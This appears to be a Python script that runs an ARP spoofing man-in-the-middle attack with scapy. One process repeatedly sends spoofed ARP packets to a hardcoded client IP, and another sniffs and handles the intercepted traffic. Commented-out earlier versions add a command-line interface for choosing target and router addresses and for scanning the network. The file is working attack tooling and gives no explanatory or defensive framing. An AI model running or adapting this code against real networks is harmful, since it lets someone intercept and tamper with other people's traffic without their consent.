from logging import basicConfig, DEBUG, getLogger
from scapy.all import *
from multiprocessing import Process
from scapy.layers.inet import IP, ICMP
# basicConfig(level=DEBUG) 
from arpSpoofer import ARPSpoofer
import time
import signal
import sys

logger = getLogger(__name__)
procs = []
# from multiprocessing import Process
# from scapy.all import sniff

# def packet_sniffer():
#     # Define your sniffing logic here
#     def sniff_callback(packet):
#         # Process each sniffed packet here
#         print(packet.show())

#     # Start sniffing
#     sniff(prn=sniff_callback, store=0)

# if __name__ == "__main__":
#     # Start the packet sniffing process
#     sniffer_process = Process(target=packet_sniffer)
#     sniffer_process.start()

#     # You can do other things here while the sniffer is running

#     # Wait for the sniffer process to finish (optional)
#     sniffer_process.join()

    
def mitm_func(arp):
    sniff(prn = arp.mitm_packet_handler)
def start_mitm_process(arp):
    proc = Process(target=mitm_func, args=(arp,))
    proc.start()
    procs.append(proc)
    logger.debug("Started mitm process")

def spoofing_func(arp, spoof_source=False):
    logger.debug("Spoofing these clients")
    logger.debug(arp.spoofing_clients)
    while True:
        for client in arp.spoofing_clients:
            arp._create_and_send_spoofed_packets(client, spoof_source)                
        time.sleep(2)
def start_spoofing_process(arp):
    proc = Process(target=spoofing_func, args=(arp,))
    proc.start()
    procs.append(proc)
    logger.debug("Started spoofing process")

    # def stop_spoofing_process(self):
    #     if self.spoofer_proc != None:
    #         self.spoofer_proc.terminate()
    #         self.spoofer_proc = None
    #     else:
    #         raise Scapy_Exception(f"Spoofing process not active")
    #     logger.debug("Stopped the spoofing process")


if __name__ == '__main__':
    arp = ARPSpoofer()
    arp.spoof_client('172.16.5.104', 'mitm')
    start_spoofing_process(arp)
    start_mitm_process(arp)

    def signal_handler(sig, frame):
        print('You pressed Ctrl+C!')
        for proc in procs:
            proc.terminate()
        sys.exit(1)

    signal.signal(signal.SIGINT, signal_handler)
    signal.pause()

# from scapy.all import *
# from scapy.layers.l2 import ARP, Ether
# from json import dumps
# from argparse import ArgumentParser
# from logging import getLogger, basicConfig, DEBUG, WARNING

# from arpSpoofer import ARPSpoofer

# # Create the ARP request packet


# # Send the ARP request packet every 1 seconds
# # packets = []
# # packets.append(arp_request_client)
# # packets.append(arp_request_router)
# # print(packets)
# # while True:
# #     [sendp(x,verbose=False) for x in packets]
# #     # sendp(arp_request_client, verbose=False)
# #     # sendp(arp_request_router, verbose=False)
# #     time.sleep(0.1)

# # arp_result = arp_scan('172.16.5.0/24')
# # print(dumps(arp_result,indent=4))

# if __name__ == "__main__":
#     ap = ArgumentParser()
#     # Adding arguments
#     ap.add_argument("--sender_mac", type=str, help="Sender MAC address")
#     ap.add_argument("--sender_ip", type=str, help="Sender IP address 1")
#     ap.add_argument(
#         "--target_mac",
#         type=str,
#         default="1a:f8:aa:87:43:41",
#         help="Target MAC address 1",
#     )
#     ap.add_argument(
#         "--target_ip", type=str, default="172.16.7.92", help="Target IP address 1"
#     )
#     ap.add_argument("--router_mac", type=str, help="Target MAC address 2 (Router)")
#     ap.add_argument("--router_ip", type=str, help="Sender IP address 2 (Router)")

#     ap.add_argument(
#         "ip_addresses", nargs="*", help="one or more ipaddresses to spoof MAC for"
#     )
#     ap.add_argument(
#         "-s",
#         "--scan",
#         action="store_true",
#         help="scan local network for ip-mac mapping",
#     )
#     ap.add_argument("-d", "--debug", action="store_true", help="enable debug logging")
#     ap.add_argument(
#         "--status", action="store_true", help="check network status and info"
#     )
#     args = ap.parse_args()
#     print(args)

#     # arp_request_client = Ether(dst=args.target_mac, src=args.sender_mac) / \
#     #                 ARP(pdst=args.target_ip, psrc=args.sender_ip)

#     # arp_request_router = Ether(dst=args.router_mac, src=args.sender_mac) / \
#     #                 ARP(pdst=args.router_ip, psrc=args.sender_ip)

#     # Configuration
#     # status = arp.report_net_status()
#     # sender_ip = status['host_ip']
#     # sender_mac = status['host_mac']
#     # router_ip = status['gateway_ip']
#     # router_mac = status['gateway_mac']

#     # if args.sender_ip:
#     #     sender_ip = args.sender_ip
#     # if args.sender_mac:
#     #     sender_ip = args.sender_mac.replace(":", ".")
#     # if args.router_ip:
#     #     sender_ip = args.router_ip
#     # if args.router_mac:
#     #     sender_ip = args.router_mac.replace(":", ".")
#     if args.debug:
#         basicConfig(level=DEBUG)
#     else:
#         basicConfig(level=WARNING)

#     arp = ARPSpoofer()
#     if args.status:
#         print(dumps(arp.report_net_status(), indent=4))
#     # if args.scan:
#     arp.scan_network('arp')

#     target_ip = "172.16.6.109"
#     # target_mac = "06:d2:f9:3f:b1:67".replace(":", ".")

#     arp.spoof_mac(target_ip, spoof_source=False)
#     # for ip in args.ip_addresses:
#     #     try:
#     #         arp.spoof_mac(ip, spoof_source=True)
#     #     except:
#     #         logger.exception(f'Exception occured for ip address: {ip}')
#     #         continue


# # Notes: make use of ARP status for all sender and router ip and mac addresses, unless provided in args
